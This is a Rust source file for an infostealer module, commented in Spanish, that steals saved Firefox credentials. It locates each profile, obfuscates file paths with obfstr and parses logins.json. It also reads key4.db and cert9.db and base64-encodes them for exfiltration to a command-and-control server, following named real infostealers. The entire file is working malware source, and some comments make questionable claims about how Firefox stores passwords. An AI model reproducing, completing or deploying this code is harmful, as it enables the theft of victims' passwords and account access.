// Stealer para Mozilla Firefox
use crate::stealer::{Credential, StealerError, StealerResult};
use crate::stealer::common::{get_appdata_roaming, file_exists, base64_decode};
use std::path::PathBuf;
use std::fs;
use std::io::Write;
use base64::{engine::general_purpose, Engine as _};
use obfstr::obfstr;

/// Roba credenciales de Firefox
pub fn steal_firefox() -> StealerResult<Vec<Credential>> {
    let appdata = get_appdata_roaming().ok_or(StealerError::BrowserNotFound)?;

    // Firefox almacena perfiles en: %APPDATA%\Mozilla\Firefox\Profiles
    let firefox_path = appdata.join(obfstr!(r"Mozilla\Firefox\Profiles"));

    if !firefox_path.exists() {
        return Err(StealerError::BrowserNotFound);
    }

    let mut all_credentials = Vec::new();

    // Iterar sobre todos los perfiles de Firefox
    if let Ok(entries) = std::fs::read_dir(&firefox_path) {
        for entry in entries.flatten() {
            if entry.path().is_dir() {
                // Intentar extraer credenciales de este perfil
                match extract_firefox_profile(&entry.path()) {
                    Ok(mut creds) => all_credentials.append(&mut creds),
                    Err(_) => continue,  // Ignorar perfiles que fallan
                }
            }
        }
    }

    if all_credentials.is_empty() {
        Err(StealerError::BrowserNotFound)
    } else {
        Ok(all_credentials)
    }
}

/// Extrae credenciales de un perfil específico de Firefox
fn extract_firefox_profile(profile_path: &PathBuf) -> StealerResult<Vec<Credential>> {
    // ESTRATEGIA FICKER-STEALER:
    // Firefox moderno (133+) cifra credenciales con NSS
    // En lugar de intentar descifrar client-side (complejo, requiere nss3.dll),
    // exfiltramos los archivos RAW al C2 para descifrado server-side
    //
    // Archivos necesarios para descifrado NSS:
    // - key4.db: Contiene la master key cifrada
    // - logins.json: Credenciales (si existe, versiones antiguas)
    // - cert9.db: Certificados NSS (opcional pero útil)

    let mut credentials = Vec::new();

    // Método 1: Intentar logins.json (Firefox antiguas <133)
    let logins_json = profile_path.join(obfstr!("logins.json"));
    if file_exists(&logins_json) {
        if let Ok(content) = std::fs::read_to_string(&logins_json) {
            if let Ok(creds) = parse_firefox_logins(&content, None) {
                if !creds.is_empty() {
                    return Ok(creds);
                }
            }
        }
    }

    // Método 2: Firefox moderno - Leer archivos y enviar como Base64
    // En lugar de copiar a directorio local, leemos los archivos y los
    // incluimos en las credenciales como Base64 para que el server los reciba

    let mut files_data = Vec::new();

    // Leer key4.db (CRÍTICO)
    if let Ok(data) = fs::read(profile_path.join(obfstr!("key4.db"))) {
        files_data.push((obfstr!("key4.db").to_string(), general_purpose::STANDARD.encode(&data)));
    }

    // Leer logins.json (si existe)
    if let Ok(data) = fs::read(profile_path.join(obfstr!("logins.json"))) {
        files_data.push((obfstr!("logins.json").to_string(), general_purpose::STANDARD.encode(&data)));
    }

    // Leer cert9.db (certificados)
    if let Ok(data) = fs::read(profile_path.join(obfstr!("cert9.db"))) {
        files_data.push((obfstr!("cert9.db").to_string(), general_purpose::STANDARD.encode(&data)));
    }

    // Si leímos archivos, crear credenciales con los datos
    if !files_data.is_empty() {
        let profile_name = profile_path.file_name()
            .and_then(|n| n.to_str())
            .unwrap_or("unknown");

        // Crear una credencial por cada archivo
        for (filename, b64_data) in files_data {
            credentials.push(Credential {
                browser: "Firefox-RAW".to_string(),
                url: format!("{}::{}", profile_name, filename),
                username: format!("{} bytes", b64_data.len()),
                password: b64_data,
            });
        }
    }

    if credentials.is_empty() {
        Err(StealerError::DatabaseError("No Firefox credentials found".into()))
    } else {
        Ok(credentials)
    }
}

/// Parsea logins.json y extrae credenciales
fn parse_firefox_logins(json_content: &str, _master_key: Option<&[u8]>) -> StealerResult<Vec<Credential>> {
    let mut credentials = Vec::new();

    // REALIDAD DE FIREFOX (basado en análisis de infostealers modernos):
    // - Por defecto, Firefox USA "username" y "password" (Base64, NO encriptados)
    // - SOLO si el usuario configuró Master Password, usa "encryptedUsername" y "encryptedPassword"
    // - El 99% de usuarios NO tiene Master Password configurada
    //
    // Estrategia de infostealers reales (Satan, Hannibal, Ficker):
    // 1. Intentan campos en texto plano (username/password)
    // 2. Si fallan, simplemente ignoran (no vale la pena implementar NSS decrypt)
    //
    // Referencias:
    // - Satan-Stealer: Solo roba Chromium passwords, ignora Firefox completamente
    // - FickerStealer: Envía logins.json RAW al C2, el servidor hace decrypt
    // - Hannibal: "Firefox does not encrypt cookies at rest (unless a master password is set)"

    if let Some(logins_start) = json_content.find("\"logins\":[") {
        let logins_section = &json_content[logins_start..];

        // Buscar cada objeto login
        let mut pos = 0;
        while let Some(entry_start) = logins_section[pos..].find("{") {
            pos += entry_start;

            if let Some(entry_end) = logins_section[pos..].find("}") {
                let entry = &logins_section[pos..pos + entry_end + 1];

                // Extraer hostname
                let hostname = extract_json_field(entry, "hostname");

                // Firefox SIN Master Password: usa campos "username" y "password" (Base64)
                let plain_username = extract_json_field(entry, "username");
                let plain_password = extract_json_field(entry, "password");

                if let Some(url) = hostname {
                    if let (Some(user_b64), Some(pass_b64)) = (plain_username, plain_password) {
                        // Decodificar Base64 (Firefox codifica en Base64 pero NO encripta)
                        let username = base64_decode(&user_b64)
                            .ok()
                            .and_then(|bytes| String::from_utf8(bytes).ok())
                            .unwrap_or_else(|| user_b64.clone());  // Si falla decode, usar raw

                        let password = base64_decode(&pass_b64)
                            .ok()
                            .and_then(|bytes| String::from_utf8(bytes).ok())
                            .unwrap_or_else(|| pass_b64.clone());  // Si falla decode, usar raw

                        credentials.push(Credential {
                            browser: "Firefox".to_string(),
                            url,
                            username,
                            password,
                        });
                    }
                }

                pos += entry_end + 1;
            } else {
                break;
            }
        }
    }

    Ok(credentials)
}

/// Extrae un campo de un objeto JSON simple
fn extract_json_field(json: &str, field: &str) -> Option<String> {
    let pattern = format!("\"{}\":\"", field);
    if let Some(start) = json.find(&pattern) {
        let value_start = start + pattern.len();
        if let Some(end) = json[value_start..].find("\"") {
            return Some(json[value_start..value_start + end].to_string());
        }
    }
    None
}
